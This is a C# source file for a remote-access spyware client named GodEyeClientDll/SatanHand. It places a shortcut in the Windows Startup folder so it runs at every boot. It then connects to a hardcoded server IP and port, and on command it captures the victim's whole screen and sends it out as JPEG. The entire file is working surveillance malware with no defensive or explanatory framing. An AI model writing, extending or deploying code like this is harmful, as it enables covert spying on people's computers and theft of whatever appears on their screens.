using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Net;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace GodEyeClientDll
{
    public class SatanHand
    {
        /// <summary>
        /// Error Message
        /// </summary>
        private String ErrMsg = String.Empty;

        private static SatanHand s;

        /// <summary>
        /// The name of the .lnk file which you want to create in system Auto Starting Directory
        /// </summary>
        private String QKName;

        /// <summary>
        /// System Auto Starting path
        /// </summary>
        private String SysStartPath { get { return Environment.GetFolderPath(Environment.SpecialFolder.Startup); } }

        /// <summary>
        /// App Path
        /// </summary>
        private String AppPath { get { return Process.GetCurrentProcess().MainModule.FileName; } }

        /// <summary>
        /// IP Address of GodEyeServer
        /// </summary>
        private const String ipAddress = "157.52.171.38";

        /// <summary>
        /// port of GodEyeServer
        /// </summary>
        private const int port = 10580;

        private static byte[] buffer = new byte[10];
        private static int SW { get { return Screen.PrimaryScreen.Bounds.Width; } }
        private static int SH { get { return Screen.PrimaryScreen.Bounds.Height; } }

        /// <summary>
        /// SatanHand
        /// </summary>
        /// <param name="ProName">The name of the .lnk file which you want to create in system Auto Starting Directory</param>
        public SatanHand(String ProName)
        {
            this.QKName = ProName;
            s = this;
        }
        
        public void SatanHandRun()
        {
            try
            {
                Boolean AutoStartFlag = setAutoStart();
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(new IPEndPoint(IPAddress.Parse(ipAddress), port));

                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallBack, socket);
            }
            catch(Exception ex)
            {
                this.ErrMsg += ex.Message + ';';
            }
            
        }

        private static void ReceiveCallBack(IAsyncResult ar)
        {
            try
            {
                Socket socket = ar.AsyncState as Socket;
                int count = socket.EndReceive(ar);
                String msg = Encoding.UTF8.GetString(buffer, 0, count);
                switch (msg)
                {
                    case "B":
                        {
                            Bitmap bmp = new Bitmap(SW, SH);
                            using (Graphics graphics = Graphics.FromImage(bmp))
                            {
                                graphics.CopyFromScreen(0, 0, 0, 0, new Size(SW, SH));
                            }
                            socket.Send(Bitmap2Byte(bmp));
                            break;
                        }
                    case "D":
                        {
                            //TODO:Disconnect
                            break;
                        }
                    case "H":
                        {
                            socket.Send(Encoding.UTF8.GetBytes(SH.ToString()));
                            break;
                        }
                    case "W":
                        {
                            socket.Send(Encoding.UTF8.GetBytes(SW.ToString()));
                            break;
                        }
                    default:
                        {
                            break;
                        }
                }
                socket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallBack, socket);
            }
            catch (Exception ex)
            {
                s.ErrMsg += ex.Message + ';';
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="bitmap"></param>
        /// <returns></returns>
        private static byte[] Bitmap2Byte(Bitmap bitmap)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Jpeg);
                byte[] data = new byte[stream.Length];
                stream.Seek(0, SeekOrigin.Begin);
                stream.Read(data, 0, Convert.ToInt32(stream.Length));
                return data;
            }
        }

        /// <summary>
        /// Start up Automatically while Booting
        /// </summary>
        /// <returns></returns>
        private Boolean setAutoStart()
        {
            List<String> ShortcutPaths = getQuickFromFolder(SysStartPath, AppPath);
            if(ShortcutPaths.Count > 1)
            {
                for(int i = 1; i < ShortcutPaths.Count; i++)
                {
                    DeleteFileOrFolder(ShortcutPaths[i]);
                }
            }
            else if (ShortcutPaths.Count < 1) 
            {
                if(!CreateShortcut(SysStartPath, QKName, AppPath))
                {
                    return false;
                }
            }

            return true;
        }


        /// <summary>
        /// Get Quick Link File whose Target Path is the Value of the Param named "targetPath" from a Folder
        /// </summary>
        /// <param name="dir"></param>
        /// <param name="targetPath"></param>
        /// <returns></returns>
        private List<String> getQuickFromFolder(String dir,String targetPath) 
        {
            List<String> vs = new List<String>();
            vs.Clear();
            String temp = String.Empty;
            String[] files = Directory.GetFiles(dir, "*.lnk");
            if (files.Equals(null) || files.Length < 1)
            {
                return vs;
            }
            for(int i = 0; i < files.Length; i++)
            {
                temp = getAppPath(files[i]);
                if (temp.Equals(targetPath))
                {
                    vs.Add(files[i]);
                }
            }
            return vs;
        } 

        /// <summary>
        /// Delete File or Folder
        /// </summary>
        /// <param name="path"></param>
        private void DeleteFileOrFolder(String path)
        {
            FileAttributes fileAttributes = System.IO.File.GetAttributes(path);
            if (fileAttributes.Equals(FileAttributes.Directory))
            {
                Directory.Delete(path, true);
            }
            else
            {
                System.IO.File.Delete(path);
            }
        }

        /// <summary>
        /// Create Shortcut
        /// </summary>
        /// <param name="dir"></param>
        /// <param name="name"></param>
        /// <param name="target_path"></param>
        /// <returns></returns>
        private Boolean CreateShortcut(String dir,String name,String target_path)
        {
            try
            {
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                }
                String shortcutPath = Path.Combine(dir, String.Format("{0}.lnk", name));
                WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshShortcut wshShortcut = shell.CreateShortcut(shortcutPath) as IWshShortcut;
                wshShortcut.TargetPath = target_path;
                wshShortcut.WorkingDirectory = Path.GetDirectoryName(target_path);
                wshShortcut.WindowStyle = 1;
                wshShortcut.Save();
                return true;
            }
            catch(Exception ex)
            {
                ErrMsg += ex.Message + ';';
            }
            return false;
        }

        /// <summary>
        /// get the target path of a link file 
        /// </summary>
        /// <param name="shortcutPath">the path of the link file</param>
        /// <returns>target path</returns>
        private String getAppPath(String shortcutPath)
        {
            if (System.IO.File.Exists(shortcutPath))
            {
                WshShell shell = new WshShell();
                IWshShortcut shortcut = shell.CreateShortcut(shortcutPath);
                return shortcut.TargetPath;
            }
            return "";
        }
    }
}
